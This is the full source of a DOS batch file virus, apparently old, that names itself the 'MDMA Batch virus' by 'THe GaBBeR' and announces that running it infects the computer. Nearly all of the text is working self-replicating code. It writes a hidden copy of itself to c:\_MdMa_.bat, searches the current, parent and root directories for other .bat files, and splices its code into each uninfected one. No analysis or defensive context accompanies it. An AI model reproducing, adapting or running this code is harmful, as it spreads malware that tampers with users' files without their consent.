@if '%_GABBER%==' goto _GABBER
@ECHO OFF
CLS
rem --------------------------------------------------------------------
ECHO By running this batch file, your computer is infected by the......
ECHO               ----------------------------
ECHO            MDMA Batch virus ---- by THe GaBBeR.
ECHO               ----------------------------
ECHO To remove the batch virus from your computer just delete all the
ECHO         text the virus has add to your original .bat
rem -------------------------------------------------------------------

@if not '%_GABBER%==' goto MdMa_end
:_GABBER MdMa_
@echo off%_MdMa_%
if '%1=='MdMa_ goto MdMa_%2
set MdMa_=%0.bat
if not exist %MdMa_% set MdMa_=%0
if '%MdMa_%==' set MdMa_=autoexec.bat
set !MdMa_=%1 %2 %3 %4 %5 %6 %7 %8 %9
if exist c:\_MdMa_.bat goto MdMa_g
if not exist %MdMa_% goto eMdMa_
find "MdMa_"<%MdMa_%>c:\_MdMa_.bat
attrib c:\_MdMa_.bat +h
:MdMa_g
command /e:5000 /c c:\_MdMa_ MdMa_ vir
:eMdMa_
call %MdMa_% MdMa_ rh
set _GABBER=>nul.MdMa_
set !MdMa_=
set MdMa_=
goto MdMa_end
:MdMa_rh
set _GABBER=x%_MdMa_%
%MdMa_% %!MdMa_%
:MdMa_vir
for %%a in (*.bat ..\*.bat c:*.bat) do call c:\_MdMa_ MdMa_ i %%a
exit MdMa_
:MdMa_i
find "MdMa_"<%3>nul
if not errorlevel 1 goto MdMa_j
echo @if '%%_GABBER%%==' goto _GABBER>MdMa_$
type %3>>MdMa_$
echo.>>MdMa_$
type c:\_MdMa_.bat>>MdMa_$
move MdMa_$ %3>nul
set MdMa_#=%MdMa_#%1
if %MdMa_#%==1111 exit
:MdMa_j
set MdMa_!=%MdMa_!%1
if %MdMa_!%==1111111111 exit
:MdMa_end
